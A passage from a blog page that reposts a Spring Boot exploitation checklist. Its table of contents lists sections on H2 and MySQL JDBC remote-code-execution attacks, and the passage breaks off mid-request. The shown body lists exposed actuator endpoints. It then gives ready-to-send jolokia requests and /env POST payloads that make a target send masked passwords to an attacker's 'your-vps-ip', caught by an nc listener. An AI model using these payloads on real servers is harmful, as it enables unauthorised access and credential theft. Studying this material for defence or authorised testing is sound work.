+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞原理-4&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞分析-4&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞环境-4&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x06h2-database-query-rce&quot;&gt;0x06：h2 database query RCE&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-9&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-9&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞原理-5&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞分析-5&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞环境-5&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x07h2-database-console-jndi-rce&quot;&gt;0x07：h2 database console JNDI RCE&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-10&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-10&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞分析-6&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞环境-6&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x08mysql-jdbc-deserialization-rce&quot;&gt;0x08：mysql jdbc deserialization RCE&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用条件-11&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#利用方法-11&quot;&gt;利用方法：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞原理-6&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞分析-7&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#漏洞环境-7&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+            &lt;/code-index-css&gt;
+        &lt;/li&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+
+    &lt;/div&gt;&lt;!--/row --&gt;
+&lt;/div&gt;&lt;!--/container --&gt;哨兵安全实验室 SENTINEL SECURITY, LAB" />
+<meta property="og:image" content="https://bin4xin.sentrylab.cn/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="https://bin4xin.sentrylab.cn/blog/2020/spring-boot-vuln-summary/" />
+<title> 不得不谈的：「Spring Boot」未授权渗透 | © 哨兵 | SENTINEL SECURITY, LAB</title>
+
+<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
+<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
+<script src="/assets/js/pace.min.js"></script>
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+<link href="/assets/css/bilibili_icon.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+
+<!--mathjax-config scripts.-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+</script>
+<script src="/assets/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!--mathjax-config scripts stop.-->
+
+
+
+</head>
+
+
+    <body>
+
+                <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <!-- logo+popover整体包裹，便于布局和交互 -->
+            <div class="navbar-logo-hover-wrap">
+                <a class="gb_A flex-justify-center-l navbar-logo" href="/" title="返回首页" tabindex="0" aria-label="返回首页">
+                    <picture>
+  <svg style="vertical-align: middle;" aria-hidden="true" focusable="false" role="img" class="color-fg-default" viewBox="0 0 16 16" width="42" height="42" fill="currentColor" style=""><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+  
+</picture>
+                </a>
+                <!-- Apple/GitHub 风格美化的 popover -->
+                <div class="navbar-logo-popover" tabindex="-1">
+                    <div class="popover-arrow"></div>
+                    <ul>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <li>
+                                <a class="popover-link" href="https://github.com/Bin4xin/bigger-than-bigger/" target="_blank">
+                                    <span class="fa fa-code-fork"></span>
+                                    <span class="popover-link-text">BIGGER THAN BIGGER</span>
+                                </a>
+                            </li>
+                            
+                            <li>
+                                <a class="popover-link" href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="_blank">
+                                    <span class="fa fa-code-fork"></span>
+                                    <span class="popover-link-text">COLLECTION OF VERIFIED VULNERABILITIES</span>
+                                </a>
+                            </li>
+                            
+                            <li>
+                                <a class="popover-link" href="https://github.com/Bin4xin/sweet-ysoserial" target="_blank">
+                                    <span class="fa fa-code-fork"></span>
+                                    <span class="popover-link-text">SWEET-YSOSERIAL</span>
+                                </a>
+                            </li>
+                            
+                        
+                    
+                        
+                    
+                        
+                    
+                        
+                    
+                        
+                    
+                    </ul>
+                </div>
+            </div>
+            <!-- 菜单按钮 -->
+            <button type="button" class="navbar-toggle" id="navbar-toggle-btn" data-toggle="collapse" data-target=".navbar-collapse" aria-label="切换导航菜单" aria-expanded="false" aria-controls="main-nav" style="outline:2px solid transparent; margin-left: 8px;">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+        </div>
+        <div class="navbar-collapse collapse navbar-right">
+            <ul class="nav navbar-nav">
+                
+                <li ><a href="/"><div class="fa fa-search"></div></a></li>
+                <li class="active"><a href="/blog/">BLOG</a></li>
+                <li ><a href="/categories/">CATEGORIES</a></li>
+                <li ><a href="/daily/">DAILY</a></li>
+                <li ><a href="/newest">NEWEST</a></li>
+                <li ><a href="/about/">RESEARCH</a></li>
+                <li ><a href="/feed.xml">RSS</a></li>
+                
+            </ul>
+        </div><!--/.nav-collapse -->
+    </div>
+</div>
+<script>
+// 菜单展开/收起交互优化，支持键盘操作
+(function() {
+    var btn = document.getElementById('navbar-toggle-btn');
+    var nav = document.querySelector('.navbar-collapse');
+    if (!btn || !nav) return;
+    btn.addEventListener('click', function() {
+        var expanded = btn.getAttribute('aria-expanded') === 'true';
+        btn.setAttribute('aria-expanded', !expanded);
+        nav.classList.toggle('show');
+    });
+    btn.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' || e.key === ' ') {
+            btn.click();
+            e.preventDefault();
+        }
+    });
+})();
+</script>
+
+                <div class="container mtb">
+    <div class="row d-flex ">
+        <!-- SINGLE POST -->
+        <div class="col-lg-8 markdown-body-img flex-column">
+            <!-- Blog Post  -->
+            <a href="/blog/2020/spring-boot-vuln-summary/"><h1 class="ctitle">不得不谈的：「Spring Boot」未授权渗透</h1></a>
+            <csmall><div class="d-flex items-center">
+                <!--article author end-->
+
+<!-- site build time set to the latest time.-->
+
+<!-- post time-->
+
+
+
+
+
+<div class="ml-hide">
+    <a class="f2 d-flex color-fg-default" href="https://github.com/LandGrey" target="_blank">
+        LandGrey
+
+        
+            
+            <!-- wrench time-->
+            
+        edited
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Oct 8, 2022
+        
+    </a>
+</div>
+            </div></csmall>
+            <div class="post-content"> 
+            <h3 id="声明">声明</h3>
+
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit">这是转载地址</a>，
+<strong>若作者介意请联系：「administrator@sentrylab.cn」删除转载文章</strong></p>
+
+<h4 id="spring-boot-vulnerability-exploit-checklist"><a href="https://github.com/LandGrey/SpringBootVulExploit" target="_blank">Spring Boot Vulnerability Exploit CheckList</a></h4>
+
+<p>Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list</p>
+
+<p><strong>Bin4xin edited. Source from LandGrey</strong></p>
+
+<h2 id="零路由和版本">零：路由和版本</h2>
+
+<h3 id="0x01路由知识">0x01：路由知识</h3>
+
+<ul>
+  <li>Spring Boot 1.x 版本默认内置路由的根路径以  <code class="language-plaintext highlighter-rouge">/</code> 开始，2.x 则统一以 <code class="language-plaintext highlighter-rouge">/actuator</code> 开始</li>
+  <li>有些程序员会自定义 <code class="language-plaintext highlighter-rouge">/manage</code>、<code class="language-plaintext highlighter-rouge">/management</code> 或 <strong>项目相关名称</strong> 为根路径</li>
+  <li>默认内置路由名字，如 <code class="language-plaintext highlighter-rouge">/env</code> 有时候也会被程序员修改，如修改成 <code class="language-plaintext highlighter-rouge">/appenv</code></li>
+</ul>
+
+<h3 id="0x02版本知识">0x02：版本知识</h3>
+
+<blockquote>
+  <p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。</p>
+</blockquote>
+
+<h4 id="常见组件的版本相互依赖关系">常见组件的版本相互依赖关系：</h4>
+
+<table class="table">
+  <thead>
+    <tr>
+      <th>依赖项</th>
+      <th>版本列表及依赖组件版本</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>spring-boot-starter-parent</td>
+      <td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td>
+    </tr>
+    <tr>
+      <td>spring-boot-dependencies</td>
+      <td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td>
+    </tr>
+    <tr>
+      <td>spring-cloud-dependencies</td>
+      <td><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="spring-cloud-与-spring-boot-大版本之间的依赖关系">Spring Cloud 与 Spring Boot 大版本之间的依赖关系：</h4>
+
+<table class="table">
+  <thead>
+    <tr>
+      <th>Spring Cloud</th>
+      <th>Spring Boot</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Angel</td>
+      <td>兼容 Spring Boot 1.2.x</td>
+    </tr>
+    <tr>
+      <td>Brixton</td>
+      <td>兼容 Spring Boot 1.3.x、1.4.x</td>
+    </tr>
+    <tr>
+      <td>Camden</td>
+      <td>兼容 Spring Boot 1.4.x、1.5.x</td>
+    </tr>
+    <tr>
+      <td>Dalston</td>
+      <td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+    </tr>
+    <tr>
+      <td>Edgware</td>
+      <td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+    </tr>
+    <tr>
+      <td>Finchley</td>
+      <td>兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
+    </tr>
+    <tr>
+      <td>Greenwich</td>
+      <td>兼容 Spring Boot 2.1.x</td>
+    </tr>
+    <tr>
+      <td>Hoxton</td>
+      <td>兼容 Spring Boot 2.2.x</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="spring-cloud-小版本号的后缀及含义">Spring Cloud 小版本号的后缀及含义:</h4>
+
+<table class="table">
+  <thead>
+    <tr>
+      <th>版本号后缀</th>
+      <th>含义</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>BUILD-SNAPSHOT</td>
+      <td>快照版，代码不是固定，处于变化之中</td>
+    </tr>
+    <tr>
+      <td>MX</td>
+      <td>里程碑版</td>
+    </tr>
+    <tr>
+      <td>RCX</td>
+      <td>候选发布版</td>
+    </tr>
+    <tr>
+      <td>RELEASE</td>
+      <td>正式发布版</td>
+    </tr>
+    <tr>
+      <td>SRX</td>
+      <td>(修复错误和 bug 并再次发布的)正式发布版</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="一信息泄露">一：信息泄露</h2>
+
+<h3 id="0x01路由地址及接口调用详情泄漏">0x01：路由地址及接口调用详情泄漏</h3>
+
+<blockquote>
+  <p>开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞</p>
+</blockquote>
+
+<p>直接访问以下几个路由，验证漏洞是否存在：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api-docs
+/v2/api-docs
+/swagger-ui.html
+</code></pre></div></div>
+
+<p>一些可能会遇到的接口路由变形：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api.html
+/sw/swagger-ui.html
+/api/swagger-ui.html
+/template/swagger-ui.html
+/spring-security-rest/api/swagger-ui.html
+/spring-security-oauth-resource/swagger-ui.html
+</code></pre></div></div>
+
+<p>除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mappings
+/actuator/mappings
+/metrics
+/actuator/metrics
+/beans
+/actuator/beans
+/configprops
+/actuator/configprops
+</code></pre></div></div>
+
+<p><strong>一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>；</p>
+
+<p>但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。</p>
+
+<h3 id="0x02配置不当而暴露的路由">0x02：配置不当而暴露的路由</h3>
+
+<blockquote>
+  <p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
+</blockquote>
+
+<p>参考 <a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints">production-ready-endpoints</a> 和 <a href="https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">spring-boot.txt</a>，可能因为配置不当而暴露的默认内置路由可能会有：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/actuator
+/auditevents
+/autoconfig
+/beans
+/caches
+/conditions
+/configprops
+/docs
+/dump
+/env
+/flyway
+/health
+/heapdump
+/httptrace
+/info
+/intergrationgraph
+/jolokia
+/logfile
+/loggers
+/liquibase
+/metrics
+/mappings
+/prometheus
+/refresh
+/scheduledtasks
+/sessions
+/shutdown
+/trace
+/threaddump
+/actuator/auditevents
+/actuator/beans
+/actuator/health
+/actuator/conditions
+/actuator/configprops
+/actuator/env
+/actuator/info
+/actuator/loggers
+/actuator/heapdump
+/actuator/threaddump
+/actuator/metrics
+/actuator/scheduledtasks
+/actuator/httptrace
+/actuator/mappings
+/actuator/jolokia
+/actuator/hystrix.stream
+</code></pre></div></div>
+
+<p>其中对寻找漏洞比较重要接口的有：</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">/env</code>、<code class="language-plaintext highlighter-rouge">/actuator/env</code></p>
+
+    <p>GET 请求 <code class="language-plaintext highlighter-rouge">/env</code> 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；</p>
+
+    <p>同时有一定概率可以通过 POST 请求 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置一些属性，触发相关 RCE 漏洞。</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">/jolokia</code></p>
+
+    <p>通过 <code class="language-plaintext highlighter-rouge">/jolokia/list</code> 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">/trace</code></p>
+
+    <p>一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息</p>
+  </li>
+</ul>
+
+<h3 id="0x03获取被星号脱敏的密码的明文-方法一">0x03：获取被星号脱敏的密码的明文 (方法一)</h3>
+
+<blockquote>
+  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+
+<h4 id="利用条件">利用条件：</h4>
+
+<ul>
+  <li>目标网站存在 <code class="language-plaintext highlighter-rouge">/jolokia</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/jolokia</code> 接口</li>
+  <li>目标使用了 <code class="language-plaintext highlighter-rouge">jolokia-core</code> 依赖（版本要求暂未知）</li>
+</ul>
+
+<h4 id="利用方法">利用方法：</h4>
+
+<h5 id="步骤一-找到想要获取的属性名">步骤一： 找到想要获取的属性名</h5>
+
+<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+
+<h5 id="步骤二-jolokia-调用相关-mbean-获取明文">步骤二： jolokia 调用相关 Mbean 获取明文</h5>
+
+<p>将下面示例中的 <code class="language-plaintext highlighter-rouge">security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code class="language-plaintext highlighter-rouge">value</code> 键中。</p>
+
+<ul>
+  <li>调用 <code class="language-plaintext highlighter-rouge">org.springframework.boot</code> Mbean（<strong>可能更通用</strong>）</li>
+</ul>
+
+<blockquote>
+  <p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
+</blockquote>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /jolokia
+Content-Type: application/json
+
+{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/jolokia
+Content-Type: application/json
+
+{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
+</code></pre></div></div>
+
+<ul>
+  <li>调用 <code class="language-plaintext highlighter-rouge">org.springframework.cloud.context.environment</code> Mbean（<strong>需要 spring cloud 相关依赖</strong>）</li>
+</ul>
+
+<blockquote>
+  <p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
+</blockquote>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /jolokia
+Content-Type: application/json
+
+{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/jolokia
+Content-Type: application/json
+
+{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
+</code></pre></div></div>
+
+<h3 id="0x04获取被星号脱敏的密码的明文-方法二">0x04：获取被星号脱敏的密码的明文 (方法二)</h3>
+
+<blockquote>
+  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+
+<h4 id="利用条件-1">利用条件：</h4>
+
+<ul>
+  <li>可以 GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code></li>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code></li>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
+  <li>目标使用了 <code class="language-plaintext highlighter-rouge">spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
+  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+
+<h4 id="利用方法-1">利用方法：</h4>
+
+<h5 id="步骤一-找到想要获取的属性名-1">步骤一： 找到想要获取的属性名</h5>
+
+<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+
+<h5 id="步骤二-使用-nc-监听-http-请求">步骤二： 使用 nc 监听 HTTP 请求</h5>
+
+<p>在自己控制的外网服务器上监听 80 端口：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvk</span> 80
+</code></pre></div></div>
+
+<h5 id="步骤三-设置-eurekaclientserviceurldefaultzone-属性">步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h5>
+
+<p>将下面 <code class="language-plaintext highlighter-rouge">http://value:${security.user.password}@your-vps-ip</code>  中的  <code class="language-plaintext highlighter-rouge">security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；</p>
+
+<p><code class="language-plaintext highlighter-rouge">your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
+Content-Type: application/json
+
+{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}
+</code></pre></div></div>
+
+<h5 id="步骤四-刷新配置">步骤四： 刷新配置</h5>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
+Content-Type: application/json
+
+</code></pre></div></div>
+
+<h5 id="步骤五-解码属性值">步骤五： 解码属性值</h5>
+
+<p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code class="language-plaintext highlighter-rouge">Authorization</code> 头内容：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Authorization: Basic dmFsdWU6MTIzNDU2
+</code></pre></div></div>
+
+<p>将其中的 <code class="language-plaintext highlighter-rouge">dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code class="language-plaintext highlighter-rouge">value:123456</code>，其中的 <code class="language-plaintext highlighter-rouge">123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>
+
+<h3 id="0x05获取被星号脱敏的密码的明文-方法三">0x05：获取被星号脱敏的密码的明文 (方法三)</h3>
+
+<blockquote>
+  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+
+<h4 id="利用条件-2">利用条件：</h4>
+
+<ul>
+  <li>通过 POST <code class="language-plaintext highlighter-rouge">/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li>
+  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+
+<h4 id="利用方法-2">利用方法：</h4>
+
+<blockquote>
+  <p>参考 UUUUnotfound 提出的 <a href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据</p>
+</blockquote>
+
+<h5 id="步骤一-找到想要获取的属性名-2">步骤一： 找到想要获取的属性名</h5>
+
+<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+
+<h5 id="步骤二-使用-nc-监听-http-请求-1">步骤二： 使用 nc 监听 HTTP 请求</h5>
+
+<p>在自己控制的外网服务器上监听 80 端口：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvk</span> 80
+</code></pre></div></div>
+
+<h5 id="步骤三-触发对外-http-请求">步骤三： 触发对外 http 请求</h5>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）：</li>
+</ul>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
+Content-Type: application/json
+
+{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）：</li>
+</ul>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
